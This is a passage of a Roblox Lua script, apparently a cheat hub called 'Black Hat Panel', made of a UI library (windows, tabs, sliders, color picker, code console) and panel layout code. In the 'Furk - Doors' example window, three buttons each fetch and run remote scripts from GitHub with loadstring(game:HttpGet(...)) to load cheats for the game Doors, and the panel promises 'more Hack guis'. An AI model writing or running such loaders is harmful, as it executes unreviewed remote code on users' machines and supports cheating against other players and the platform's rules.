					oldIcon = mouse.Icon
					-- mouse.Icon = "http://www.roblox.com/asset?id=4745131330"
				end
				Entered = true
			end)

			Resizer.MouseLeave:Connect(function()
				Entered = false
				if options.can_resize then
					mouse.Icon = oldIcon
				end
				Window.Draggable = true
			end)

			local Held = false
			UIS.InputBegan:Connect(function(inputObject)
				if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
					Held = true

					spawn(function() -- Loop check
						if Entered and Resizer.Active and options.can_resize then
							while Held and Resizer.Active do

								local mouse_location = gMouse()
								local x = mouse_location.X - Window.AbsolutePosition.X
								local y = mouse_location.Y - Window.AbsolutePosition.Y

								--
								if x >= options.min_size.X and y >= options.min_size.Y then
									Resize(Window, {Size = UDim2.new(0, x, 0, y)}, options.tween_time)
								elseif x >= options.min_size.X then
									Resize(Window, {Size = UDim2.new(0, x, 0, options.min_size.Y)}, options.tween_time)
								elseif y >= options.min_size.Y then
									Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, y)}, options.tween_time)
								else
									Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)}, options.tween_time)
								end

								RS.Heartbeat:Wait()
							end
						end
					end)
				end
			end)
			UIS.InputEnded:Connect(function(inputObject)
				if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
					Held = false
				end
			end)
		end

		do -- [Open / Close] Window
			local open_close = Window:FindFirstChild("Bar"):FindFirstChild("Toggle")
			local open = true
			local canopen = true

			local oldwindowdata = {}
			local oldy = Window.AbsoluteSize.Y
			open_close.MouseButton1Click:Connect(function()
				if canopen then
					canopen = false

					if open then
						-- Close

						oldwindowdata = {}
						for i,v in next, Window:FindFirstChild("Tabs"):GetChildren() do
							oldwindowdata[v] = v.Visible
							v.Visible = false
						end

						Resizer.Active = false

						oldy = Window.AbsoluteSize.Y
						Resize(open_close, {Rotation = 0}, options.tween_time)
						Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, 26)}, options.tween_time)
						open_close.Parent:FindFirstChild("Base").Transparency = 1

					else
						-- Open

						for i,v in next, oldwindowdata do
							i.Visible = v
						end

						Resizer.Active = true

						Resize(open_close, {Rotation = 90}, options.tween_time)
						Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, oldy)}, options.tween_time)
						open_close.Parent:FindFirstChild("Base").Transparency = 0

					end

					open = not open
					wait(options.tween_time)
					canopen = true

				end
			end)
		end

		do -- UI Elements
			local tabs = Window:FindFirstChild("Tabs")
			local tab_selection = Window:FindFirstChild("TabSelection")
			local tab_buttons = tab_selection:FindFirstChild("TabButtons")

			do -- Add Tab
				function window_data:AddTab(tab_name)
					local tab_data = {}
					tab_name = tostring(tab_name or "New Tab")
					tab_selection.Visible = true

					local new_button = Prefabs:FindFirstChild("TabButton"):Clone()
					new_button.Parent = tab_buttons
					new_button.Text = tab_name
					new_button.Size = UDim2.new(0, gNameLen(new_button), 0, 20)
					new_button.ZIndex = new_button.ZIndex + (windows * 10)
					new_button:GetChildren()[1].ZIndex = new_button:GetChildren()[1].ZIndex + (windows * 10)

					local new_tab = Prefabs:FindFirstChild("Tab"):Clone()
					new_tab.Parent = tabs
					new_tab.ZIndex = new_tab.ZIndex + (windows * 10)

					local function show()
						if dropdown_open then return end
						for i, v in next, tab_buttons:GetChildren() do
							if not (v:IsA("UIListLayout")) then
								v:GetChildren()[1].ImageColor3 = Color3.fromRGB(52, 53, 56)
								Resize(v, {Size = UDim2.new(0, v.AbsoluteSize.X, 0, 20)}, options.tween_time)
							end
						end
						for i, v in next, tabs:GetChildren() do
							v.Visible = false
						end

						Resize(new_button, {Size = UDim2.new(0, new_button.AbsoluteSize.X, 0, 25)}, options.tween_time)
						new_button:GetChildren()[1].ImageColor3 = Color3.fromRGB(73, 75, 79)
						new_tab.Visible = true
					end

					new_button.MouseButton1Click:Connect(function()
						show()
					end)

					function tab_data:Show()
						show()
					end

					do -- Tab Elements

						function tab_data:AddLabel(label_text) -- [Label]
							label_text = tostring(label_text or "New Label")

							local label = Prefabs:FindFirstChild("Label"):Clone()

							label.Parent = new_tab
							label.Text = label_text
							label.Size = UDim2.new(0, gNameLen(label), 0, 20)
							label.ZIndex = label.ZIndex + (windows * 10)

							return label
						end

						function tab_data:AddButton(button_text, callback) -- [Button]
							button_text = tostring(button_text or "New Button")
							callback = typeof(callback) == "function" and callback or function()end

							local button = Prefabs:FindFirstChild("Button"):Clone()

							button.Parent = new_tab
							button.Text = button_text
							button.Size = UDim2.new(0, gNameLen(button), 0, 20)
							button.ZIndex = button.ZIndex + (windows * 10)
							button:GetChildren()[1].ZIndex = button:GetChildren()[1].ZIndex + (windows * 10)

							spawn(function()
								while true do
									if button and button:GetChildren()[1] then
										button:GetChildren()[1].ImageColor3 = options.main_color
									end
									RS.Heartbeat:Wait()
								end
							end)

							button.MouseButton1Click:Connect(function()
								ripple(button, mouse.X, mouse.Y)
								pcall(callback)
							end)

							return button
						end

						function tab_data:AddSwitch(switch_text, callback) -- [Switch]
							local switch_data = {}

							switch_text = tostring(switch_text or "New Switch")
							callback = typeof(callback) == "function" and callback or function()end

							local switch = Prefabs:FindFirstChild("Switch"):Clone()

							switch.Parent = new_tab
							switch:FindFirstChild("Title").Text = switch_text

							switch:FindFirstChild("Title").ZIndex = switch:FindFirstChild("Title").ZIndex + (windows * 10)
							switch.ZIndex = switch.ZIndex + (windows * 10)
							switch:GetChildren()[1].ZIndex = switch:GetChildren()[1].ZIndex + (windows * 10)

							spawn(function()
								while true do
									if switch and switch:GetChildren()[1] then
										switch:GetChildren()[1].ImageColor3 = options.main_color
									end
									RS.Heartbeat:Wait()
								end
							end)

							local toggled = false
							switch.MouseButton1Click:Connect(function()
								toggled = not toggled
								switch.Text = toggled and utf8.char(10003) or ""
								pcall(callback, toggled)
							end)

							function switch_data:Set(bool)
								toggled = (typeof(bool) == "boolean") and bool or false
								switch.Text = toggled and utf8.char(10003) or ""
								pcall(callback,toggled)
							end

							return switch_data, switch
						end

						function tab_data:AddTextBox(textbox_text, callback, textbox_options)
							textbox_text = tostring(textbox_text or "New TextBox")
							callback = typeof(callback) == "function" and callback or function()end
							textbox_options = typeof(textbox_options) == "table" and textbox_options or {["clear"] = true}
							textbox_options = {
								["clear"] = ((textbox_options.clear) == true)
							}

							local textbox = Prefabs:FindFirstChild("TextBox"):Clone()

							textbox.Parent = new_tab
							textbox.PlaceholderText = textbox_text
							textbox.ZIndex = textbox.ZIndex + (windows * 10)
							textbox:GetChildren()[1].ZIndex = textbox:GetChildren()[1].ZIndex + (windows * 10)

							textbox.FocusLost:Connect(function(ep)
								if ep then
									if #textbox.Text > 0 then
										pcall(callback, textbox.Text)
										if textbox_options.clear then
											textbox.Text = ""
										end
									end
								end
							end)

							return textbox
						end

						function tab_data:AddSlider(slider_text, callback, slider_options)
							local slider_data = {}

							slider_text = tostring(slider_text or "New Slider")
							callback = typeof(callback) == "function" and callback or function()end
							slider_options = typeof(slider_options) == "table" and slider_options or {}
							slider_options = {
								["min"] = slider_options.min or 0,
								["max"] = slider_options.max or 100,
								["readonly"] = slider_options.readonly or false,
							}

							local slider = Prefabs:FindFirstChild("Slider"):Clone()

							slider.Parent = new_tab
							slider.ZIndex = slider.ZIndex + (windows * 10)

							local title = slider:FindFirstChild("Title")
							local indicator = slider:FindFirstChild("Indicator")
							local value = slider:FindFirstChild("Value")
							title.ZIndex = title.ZIndex + (windows * 10)
							indicator.ZIndex = indicator.ZIndex + (windows * 10)
							value.ZIndex = value.ZIndex + (windows * 10)

							title.Text = slider_text

							do -- Slider Math
								local Entered = false
								slider.MouseEnter:Connect(function()
									Entered = true
									Window.Draggable = false
								end)
								slider.MouseLeave:Connect(function()
									Entered = false
									Window.Draggable = true
								end)

								local Held = false
								UIS.InputBegan:Connect(function(inputObject)
									if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
										Held = true

										spawn(function() -- Loop check
											if Entered and not slider_options.readonly then
												while Held and (not dropdown_open) do
													local mouse_location = gMouse()
													local x = (slider.AbsoluteSize.X - (slider.AbsoluteSize.X - ((mouse_location.X - slider.AbsolutePosition.X)) + 1)) / slider.AbsoluteSize.X

													local min = 0
													local max = 1

													local size = min
													if x >= min and x <= max then
														size = x
													elseif x < min then
														size = min
													elseif x > max then
														size = max
													end

													Resize(indicator, {Size = UDim2.new(size or min, 0, 0, 20)}, options.tween_time)
													local p = math.floor((size or min) * 100)

													local maxv = slider_options.max
													local minv = slider_options.min
													local diff = maxv - minv

													local sel_value = math.floor(((diff / 100) * p) + minv)

													value.Text = tostring(sel_value)
													pcall(callback, sel_value)

													RS.Heartbeat:Wait()
												end
											end
										end)
									end
								end)
								UIS.InputEnded:Connect(function(inputObject)
									if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
										Held = false
									end
								end)

								function slider_data:Set(new_value)
									new_value = tonumber(new_value) or 0
									new_value = (((new_value >= 0 and new_value <= 100) and new_value) / 100)

									Resize(indicator, {Size = UDim2.new(new_value or 0, 0, 0, 20)}, options.tween_time)
									local p = math.floor((new_value or 0) * 100)

									local maxv = slider_options.max
									local minv = slider_options.min
									local diff = maxv - minv

									local sel_value = math.floor(((diff / 100) * p) + minv)

									value.Text = tostring(sel_value)
									pcall(callback, sel_value)
								end

								slider_data:Set(slider_options["min"])
							end

							return slider_data, slider
						end

						function tab_data:AddKeybind(keybind_name, callback, keybind_options)
							local keybind_data = {}

							keybind_name = tostring(keybind_name or "New Keybind")
							callback = typeof(callback) == "function" and callback or function()end
							keybind_options = typeof(keybind_options) == "table" and keybind_options or {}
							keybind_options = {
								["standard"] = keybind_options.standard or Enum.KeyCode.RightShift,
							}

							local keybind = Prefabs:FindFirstChild("Keybind"):Clone()
							local input = keybind:FindFirstChild("Input")
							local title = keybind:FindFirstChild("Title")
							keybind.ZIndex = keybind.ZIndex + (windows * 10)
							input.ZIndex = input.ZIndex + (windows * 10)
							input:GetChildren()[1].ZIndex = input:GetChildren()[1].ZIndex + (windows * 10)
							title.ZIndex = title.ZIndex + (windows * 10)

							keybind.Parent = new_tab
							title.Text = "  " .. keybind_name
							keybind.Size = UDim2.new(0, gNameLen(title) + 80, 0, 20)

							local shortkeys = { -- thanks to stroketon for helping me out with this
								RightControl = 'RightCtrl',
								LeftControl = 'LeftCtrl',
								LeftShift = 'LShift',
								RightShift = 'RShift',
								MouseButton1 = "Mouse1",
								MouseButton2 = "Mouse2"
							}

							local keybind = keybind_options.standard

							function keybind_data:SetKeybind(Keybind)
								local key = shortkeys[Keybind.Name] or Keybind.Name
								input.Text = key
								keybind = Keybind
							end

							UIS.InputBegan:Connect(function(a, b)
								if checks.binding then
									spawn(function()
										wait()
										checks.binding = false
									end)
									return
								end
								if a.KeyCode == keybind and not b then
									pcall(callback, keybind)
								end
							end)

							keybind_data:SetKeybind(keybind_options.standard)

							input.MouseButton1Click:Connect(function()
								if checks.binding then return end
								input.Text = "..."
								checks.binding = true
								local a, b = UIS.InputBegan:Wait()
								keybind_data:SetKeybind(a.KeyCode)
							end)

							return keybind_data, keybind
						end

						function tab_data:AddDropdown(dropdown_name, callback)
							local dropdown_data = {}
							dropdown_name = tostring(dropdown_name or "New Dropdown")
							callback = typeof(callback) == "function" and callback or function()end

							local dropdown = Prefabs:FindFirstChild("Dropdown"):Clone()
							local box = dropdown:FindFirstChild("Box")
							local objects = box:FindFirstChild("Objects")
							local indicator = dropdown:FindFirstChild("Indicator")
							dropdown.ZIndex = dropdown.ZIndex + (windows * 10)
							box.ZIndex = box.ZIndex + (windows * 10)
							objects.ZIndex = objects.ZIndex + (windows * 10)
							indicator.ZIndex = indicator.ZIndex + (windows * 10)
							dropdown:GetChildren()[3].ZIndex = dropdown:GetChildren()[3].ZIndex + (windows * 10)

							dropdown.Parent = new_tab
							dropdown.Text = "      " .. dropdown_name
							box.Size = UDim2.new(1, 0, 0, 0)

							local open = false
							dropdown.MouseButton1Click:Connect(function()
								open = not open

								local len = (#objects:GetChildren() - 1) * 20
								if #objects:GetChildren() - 1 >= 10 then
									len = 10 * 20
									objects.CanvasSize = UDim2.new(0, 0, (#objects:GetChildren() - 1) * 0.1, 0)
								end

								if open then -- Open
									if dropdown_open then return end
									dropdown_open = true
									Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
									Resize(indicator, {Rotation = 90}, options.tween_time)
								else -- Close
									dropdown_open = false
									Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
									Resize(indicator, {Rotation = -90}, options.tween_time)
								end

							end)

							function dropdown_data:Add(n)
								local object_data = {}
								n = tostring(n or "New Object")

								local object = Prefabs:FindFirstChild("DropdownButton"):Clone()

								object.Parent = objects
								object.Text = n
								object.ZIndex = object.ZIndex + (windows * 10)

								object.MouseEnter:Connect(function()
									object.BackgroundColor3 = options.main_color
								end)
								object.MouseLeave:Connect(function()
									object.BackgroundColor3 = Color3.fromRGB(33, 34, 36)
								end)

								if open then
									local len = (#objects:GetChildren() - 1) * 20
									if #objects:GetChildren() - 1 >= 10 then
										len = 10 * 20
										objects.CanvasSize = UDim2.new(0, 0, (#objects:GetChildren() - 1) * 0.1, 0)
									end
									Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
								end

								object.MouseButton1Click:Connect(function()
									if dropdown_open then
										dropdown.Text = "      [ " .. n .. " ]"
										dropdown_open = false
										open = false
										Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
										Resize(indicator, {Rotation = -90}, options.tween_time)
										pcall(callback, n)
									end
								end)

								function object_data:Remove()
									object:Destroy()
								end

								return object, object_data
							end

							return dropdown_data, dropdown
						end

						function tab_data:AddColorPicker(callback)
							local color_picker_data = {}
							callback = typeof(callback) == "function" and callback or function()end

							local color_picker = Prefabs:FindFirstChild("ColorPicker"):Clone()

							color_picker.Parent = new_tab
							color_picker.ZIndex = color_picker.ZIndex + (windows * 10)

							local palette = color_picker:FindFirstChild("Palette")
							local sample = color_picker:FindFirstChild("Sample")
							local saturation = color_picker:FindFirstChild("Saturation")
							palette.ZIndex = palette.ZIndex + (windows * 10)
							sample.ZIndex = sample.ZIndex + (windows * 10)
							saturation.ZIndex = saturation.ZIndex + (windows * 10)

							do -- Color Picker Math
								local h = 0
								local s = 1
								local v = 1

								local function update()
									local color = Color3.fromHSV(h, s, v)
									sample.ImageColor3 = color
									saturation.ImageColor3 = Color3.fromHSV(h, 1, 1)
									pcall(callback, color)
								end

								do
									local color = Color3.fromHSV(h, s, v)
									sample.ImageColor3 = color
									saturation.ImageColor3 = Color3.fromHSV(h, 1, 1)
								end

								local Entered1, Entered2 = false, false
								palette.MouseEnter:Connect(function()
									Window.Draggable = false
									Entered1 = true
								end)
								palette.MouseLeave:Connect(function()
									Window.Draggable = true
									Entered1 = false
								end)
								saturation.MouseEnter:Connect(function()
									Window.Draggable = false
									Entered2 = true
								end)
								saturation.MouseLeave:Connect(function()
									Window.Draggable = true
									Entered2 = false
								end)

								local palette_indicator = palette:FindFirstChild("Indicator")
								local saturation_indicator = saturation:FindFirstChild("Indicator")
								palette_indicator.ZIndex = palette_indicator.ZIndex + (windows * 10)
								saturation_indicator.ZIndex = saturation_indicator.ZIndex + (windows * 10)

								local Held = false
								UIS.InputBegan:Connect(function(inputObject)
									if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
										Held = true

										spawn(function() -- Loop check
											while Held and Entered1 and (not dropdown_open) do -- Palette
												local mouse_location = gMouse()

												local x = ((palette.AbsoluteSize.X - (mouse_location.X - palette.AbsolutePosition.X)) + 1)
												local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)

												local color = Color3.fromHSV(x / 100, y / 100, 0)
												h = x / 100
												s = y / 100

												Resize(palette_indicator, {Position = UDim2.new(0, math.abs(x - 100) - (palette_indicator.AbsoluteSize.X / 2), 0, math.abs(y - 100) - (palette_indicator.AbsoluteSize.Y / 2))}, options.tween_time)

												update()
												RS.Heartbeat:Wait()
											end

											while Held and Entered2 and (not dropdown_open) do -- Saturation
												local mouse_location = gMouse()
												local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)
												v = y / 100

												Resize(saturation_indicator, {Position = UDim2.new(0, 0, 0, math.abs(y - 100))}, options.tween_time)

												update()
												RS.Heartbeat:Wait()
											end
										end)
									end
								end)
								UIS.InputEnded:Connect(function(inputObject)
									if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
										Held = false
									end
								end)

								function color_picker_data:Set(color)
									color = typeof(color) == "Color3" and color or Color3.new(1, 1, 1)
									local h2, s2, v2 = rgbtohsv(color.r * 255, color.g * 255, color.b * 255)
									sample.ImageColor3 = color
									saturation.ImageColor3 = Color3.fromHSV(h2, 1, 1)
									pcall(callback, color)
								end
							end

							return color_picker_data, color_picker
						end

						function tab_data:AddConsole(console_options)
							local console_data = {}

							console_options = typeof(console_options) == "table" and console_options or {["readonly"] = true,["full"] = false,}
							console_options = {
								["y"] = tonumber(console_options.y) or 200,
								["source"] = console_options.source or "Logs",
								["readonly"] = ((console_options.readonly) == true),
								["full"] = ((console_options.full) == true),
							}

							local console = Prefabs:FindFirstChild("Console"):Clone()

							console.Parent = new_tab
							console.ZIndex = console.ZIndex + (windows * 10)
							console.Size = UDim2.new(1, 0, console_options.full and 1 or 0, console_options.y)

							local sf = console:GetChildren()[1]
							local Source = sf:FindFirstChild("Source")
							local Lines = sf:FindFirstChild("Lines")
							Source.ZIndex = Source.ZIndex + (windows * 10)
							Lines.ZIndex = Lines.ZIndex + (windows * 10)

							Source.TextEditable = not console_options.readonly

							do -- Syntax Zindex
								for i,v in next, Source:GetChildren() do
									v.ZIndex = v.ZIndex + (windows * 10) + 1
								end
							end
							Source.Comments.ZIndex = Source.Comments.ZIndex + 1

							do -- Highlighting (thanks to whoever made this)
								local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
								local global_env = {"getrawmetatable", "newcclosure", "islclosure", "setclipboard", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "load", "fire", "Fire"}

								local Highlight = function(string, keywords)
									local K = {}
									local S = string
									local Token =
										{
											["="] = true,
											["."] = true,
											[","] = true,
											["("] = true,
											[")"] = true,
											["["] = true,
											["]"] = true,
											["{"] = true,
											["}"] = true,
											[":"] = true,
											["*"] = true,
											["/"] = true,
											["+"] = true,
											["-"] = true,
											["%"] = true,
											[";"] = true,
											["~"] = true
										}
									for i, v in pairs(keywords) do
										K[v] = true
									end
									S = S:gsub(".", function(c)
										if Token[c] ~= nil then
											return "\32"
										else
											return c
										end
									end)
									S = S:gsub("%S+", function(c)
										if K[c] ~= nil then
											return c
										else
											return (" "):rep(#c)
										end
									end)

									return S
								end

								local hTokens = function(string)
									local Token =
										{
											["="] = true,
											["."] = true,
											[","] = true,
											["("] = true,
											[")"] = true,
											["["] = true,
											["]"] = true,
											["{"] = true,
											["}"] = true,
											[":"] = true,
											["*"] = true,
											["/"] = true,
											["+"] = true,
											["-"] = true,
											["%"] = true,
											[";"] = true,
											["~"] = true
										}
									local A = ""
									string:gsub(".", function(c)
										if Token[c] ~= nil then
											A = A .. c
										elseif c == "\n" then
											A = A .. "\n"
										elseif c == "\t" then
											A = A .. "\t"
										else
											A = A .. "\32"
										end
									end)

									return A
								end

								local strings = function(string)
									local highlight = ""
									local quote = false
									string:gsub(".", function(c)
										if quote == false and c == "\34" then
											quote = true
										elseif quote == true and c == "\34" then
											quote = false
										end
										if quote == false and c == "\34" then
											highlight = highlight .. "\34"
										elseif c == "\n" then
											highlight = highlight .. "\n"
										elseif c == "\t" then
											highlight = highlight .. "\t"
										elseif quote == true then
											highlight = highlight .. c
										elseif quote == false then
											highlight = highlight .. "\32"
										end
									end)

									return highlight
								end

								local info = function(string)
									local highlight = ""
									local quote = false
									string:gsub(".", function(c)
										if quote == false and c == "[" then
											quote = true
										elseif quote == true and c == "]" then
											quote = false
										end
										if quote == false and c == "\]" then
											highlight = highlight .. "\]"
										elseif c == "\n" then
											highlight = highlight .. "\n"
										elseif c == "\t" then
											highlight = highlight .. "\t"
										elseif quote == true then
											highlight = highlight .. c
										elseif quote == false then
											highlight = highlight .. "\32"
										end
									end)

									return highlight
								end

								local comments = function(string)
									local ret = ""
									string:gsub("[^\r\n]+", function(c)
										local comm = false
										local i = 0
										c:gsub(".", function(n)
											i = i + 1
											if c:sub(i, i + 1) == "--" then
												comm = true
											end
											if comm == true then
												ret = ret .. n
											else
												ret = ret .. "\32"
											end
										end)
										ret = ret
									end)

									return ret
								end

								local numbers = function(string)
									local A = ""
									string:gsub(".", function(c)
										if tonumber(c) ~= nil then
											A = A .. c
										elseif c == "\n" then
											A = A .. "\n"
										elseif c == "\t" then
											A = A .. "\t"
										else
											A = A .. "\32"
										end
									end)

									return A
								end

								local highlight_lua = function(type)
									if type == "Text" then
										Source.Text = Source.Text:gsub("\13", "")
										Source.Text = Source.Text:gsub("\t", "      ")
										local s = Source.Text

										Source.Keywords.Text = Highlight(s, lua_keywords)
										Source.Globals.Text = Highlight(s, global_env)
										Source.RemoteHighlight.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
										Source.Tokens.Text = hTokens(s)
										Source.Numbers.Text = numbers(s)
										Source.Strings.Text = strings(s)
										Source.Comments.Text = comments(s)

										local lin = 1
										s:gsub("\n", function()
											lin = lin + 1
										end)

										Lines.Text = ""
										for i = 1, lin do
											Lines.Text = Lines.Text .. i .. "\n"
										end

										sf.CanvasSize = UDim2.new(0, 0, lin * 0.153846154, 0)
									end

									local highlight_logs = function(type)
									end
									if type == "Text" then
										Source.Text = Source.Text:gsub("\13", "")
										Source.Text = Source.Text:gsub("\t", "      ")
										local s = Source.Text

										Source.Info.Text = info(s)

										local lin = 1
										s:gsub("\n", function()
											lin = lin + 1
										end)

										sf.CanvasSize = UDim2.new(0, 0, lin * 0.153846154, 0)
									end
								end

								if console_options.source == "Lua" then
									highlight_lua("Text")
									Source.Changed:Connect(highlight_lua)
								elseif console_options.source == "Logs" then
									Lines.Visible = false

									highlight_logs("Text")
									Source.Changed:Connect(highlight_logs)
								end

								function console_data:Set(code)
									Source.Text = tostring(code)
								end

								function console_data:Get()
									return Source.Text
								end

								function console_data:Log(msg)
									Source.Text = Source.Text .. "[*] " .. tostring(msg) .. "\n"
								end

							end

							return console_data, console
						end

						function tab_data:AddHorizontalAlignment()
							local ha_data = {}

							local ha = Prefabs:FindFirstChild("HorizontalAlignment"):Clone()
							ha.Parent = new_tab

							function ha_data:AddButton(...)
								local data, object
								local ret = {tab_data:AddButton(...)}
								if typeof(ret[1]) == "table" then
									data = ret[1]
									object = ret[2]
									object.Parent = ha
									return data, object
								else
									object = ret[1]
									object.Parent = ha
									return object
								end
							end

							return ha_data, ha
						end

						function tab_data:AddFolder(folder_name) -- [Folder]
							local folder_data = {}

							folder_name = tostring(folder_name or "New Folder")

							local folder = Prefabs:FindFirstChild("Folder"):Clone()
							local button = folder:FindFirstChild("Button")
							local objects = folder:FindFirstChild("Objects")
							local toggle = button:FindFirstChild("Toggle")
							folder.ZIndex = folder.ZIndex + (windows * 10)
							button.ZIndex = button.ZIndex + (windows * 10)
							objects.ZIndex = objects.ZIndex + (windows * 10)
							toggle.ZIndex = toggle.ZIndex + (windows * 10)
							button:GetChildren()[1].ZIndex = button:GetChildren()[1].ZIndex + (windows * 10)

							folder.Parent = new_tab
							button.Text = "      " .. folder_name

							spawn(function()
								while true do
									if button and button:GetChildren()[1] then
										button:GetChildren()[1].ImageColor3 = options.main_color
									end
									RS.Heartbeat:Wait()
								end
							end)

							local function gFolderLen()
								local n = 25
								for i,v in next, objects:GetChildren() do
									if not (v:IsA("UIListLayout")) then
										n = n + v.AbsoluteSize.Y + 5
									end
								end
								return n
							end

							local open = false
							button.MouseButton1Click:Connect(function()
								if open then -- Close
									Resize(toggle, {Rotation = 0}, options.tween_time)
									objects.Visible = false
								else -- Open
									Resize(toggle, {Rotation = 90}, options.tween_time)
									objects.Visible = true
								end

								open = not open
							end)

							spawn(function()
								while true do
									Resize(folder, {Size = UDim2.new(1, 0, 0, (open and gFolderLen() or 20))}, options.tween_time)
									wait()
								end
							end)

							for i,v in next, tab_data do
								folder_data[i] = function(...)
									local data, object
									local ret = {v(...)}
									if typeof(ret[1]) == "table" then
										data = ret[1]
										object = ret[2]
										object.Parent = objects
										return data, object
									else
										object = ret[1]
										object.Parent = objects
										return object
									end
								end
							end

							return folder_data, folder
						end

					end

					return tab_data, new_tab
				end
			end
		end

		do
			for i, v in next, Window:GetDescendants() do
				if hasprop(v, "ZIndex") then
					v.ZIndex = v.ZIndex + (windows * 10)
				end
			end
		end

		return window_data, Window
	end

	do -- Example UI
		local Window = library:AddWindow("Furk - Doors", {
			main_color = Color3.fromRGB(0, 0, 0),
			min_size = Vector2.new(240, 180),
			toggle_key = Enum.KeyCode.RightShift,
			can_resize = true,
		})
		local Tab = Window:AddTab("Main")

		do -- Elements
			Tab:AddLabel("Thanks For Using Furk Ultra")



			Tab:AddButton("#1 GUI - Legit Cheat", function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/OminousVibes-Exploit/Scripts/main/doors/main.lua"))()
			end)
			Tab:AddButton("OP D4rk GUI (Requires Key)", function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/D4rk9690/My-scripts/main/Doors%20gui", true))() 
			end)
			Tab:AddButton("Orion GUI", function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/UltraStuff/scripts2/main/ddddors"))()
			end)




		end

		Tab:Show()
		library:FormatWindows()
	end
end)

UICorner_30.CornerRadius = UDim.new(0, 20)
UICorner_30.Parent = Doors

ComingSoon.Name = "ComingSoon"
ComingSoon.Parent = Home2
ComingSoon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ComingSoon.BackgroundTransparency = 1.000
ComingSoon.BorderSizePixel = 0
ComingSoon.Position = UDim2.new(0.263702184, 0, 0.496309966, 0)
ComingSoon.Size = UDim2.new(0, 583, 0, 198)
ComingSoon.Font = Enum.Font.Michroma
ComingSoon.Text = "More Hack guis coming soon in the next update stay tuned!"
ComingSoon.TextColor3 = Color3.fromRGB(255, 255, 255)
ComingSoon.TextScaled = true
ComingSoon.TextSize = 14.000
ComingSoon.TextStrokeTransparency = 0.000
ComingSoon.TextWrapped = true

Hacks.Name = "Hacks"
Hacks.Parent = BlackHatPanel
Hacks.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hacks.BackgroundTransparency = 1.000
Hacks.BorderSizePixel = 0
Hacks.Position = UDim2.new(0.381592542, 0, 0, 0)
Hacks.Size = UDim2.new(0, 200, 0, 43)
Hacks.Font = Enum.Font.Gotham
Hacks.Text = "Hacks"
Hacks.TextColor3 = Color3.fromRGB(255, 255, 255)
Hacks.TextScaled = true
Hacks.TextSize = 14.000
Hacks.TextWrapped = true

OpenButton.Name = "OpenButton"
OpenButton.Parent = BlackHatPanelV132
OpenButton.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
OpenButton.BorderSizePixel = 0
OpenButton.ClipsDescendants = true
OpenButton.Position = UDim2.new(0.314492136, 0, 0.939062178, 0)
OpenButton.Size = UDim2.new(0, 711, 0, 51)
OpenButton.Visible = false
OpenButton.Font = Enum.Font.Gotham
OpenButton.Text = "Open Black Hat Panel"
OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenButton.TextScaled = true
OpenButton.TextSize = 14.000
OpenButton.TextWrapped = true

UICorner_31.CornerRadius = UDim.new(0, 20)
UICorner_31.Parent = OpenButton

Executer.Name = "Executer"
Executer.Parent = BlackHatPanelV132
Executer.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
Executer.BorderSizePixel = 0
Executer.Position = UDim2.new(0.260937512, 0, 0.0941597149, 0)
Executer.Size = UDim2.new(0, 606, 0, 676)
Executer.Visible = false

ImageLabel.Parent = Executer
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.221122116, 0, 0.10207101, 0)
ImageLabel.Size = UDim2.new(0, 344, 0, 391)
ImageLabel.Image = "rbxassetid://10287033603"

Execute.Name = "Execute"
Execute.Parent = Executer
Execute.BackgroundColor3 = Color3.fromRGB(6, 6, 6)
Execute.Position = UDim2.new(0.334983498, 0, 0.91420114, 0)
Execute.Size = UDim2.new(0, 200, 0, 50)
Execute.Font = Enum.Font.Gotham
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextScaled = true
Execute.TextSize = 14.000
Execute.TextWrapped = true

UICorner_32.CornerRadius = UDim.new(0, 20)
UICorner_32.Parent = Execute

Title.Name = "Title"
Title.Parent = Executer
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
